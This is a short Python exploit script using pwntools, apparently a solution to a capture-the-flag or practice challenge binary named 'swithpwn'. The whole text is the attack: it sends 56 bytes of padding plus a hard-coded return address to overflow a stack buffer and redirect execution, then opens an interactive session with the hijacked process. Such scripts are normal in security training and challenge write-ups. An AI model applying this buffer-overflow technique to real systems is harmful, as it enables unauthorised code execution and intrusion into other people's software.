from pwn import *

# Set up the context and the binary
context.binary = ELF("./swithpwn")
p = process()

# Define the payload
payload = b'a' * 56  # Overflow the buffer
payload += p64(0x4011a6)  
p.sendline(payload)    # Send the payload

# Switch to interactive mode to interact with the shell or the program
p.interactive()
